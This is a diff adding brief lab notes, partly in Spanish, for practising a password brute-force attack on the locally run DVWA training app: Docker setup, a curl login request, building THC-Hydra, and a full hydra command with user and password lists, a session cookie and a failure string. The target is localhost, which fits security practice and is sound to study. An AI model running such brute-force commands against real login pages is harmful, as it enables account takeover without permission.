@@ -1,0 +1,18 @@
+- sudo docker version
+
+- sudo docker run --rm -it -p 8080:80 vulnerables/web-dvwa
+
+Comando curl
+-curl 'http://localhost:8080/vulnerabilities/brute/?username=1234&password==bbbb&Login'...
+
+- git clone https://github.com/vanhauser-thc/thc-hydra
+
+- ./configure
+
+- make
+
+- ./hydra
+
+- hydra -L usernames.txt -P pass.txt "http-get-form://127.0.0.1:8080/vulnerabilities/brute/:username=
+ ^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=lodvn83df5ea9eir8ba8phkqt2; security=low;:F=Username and/
+ or password incorrect."-I
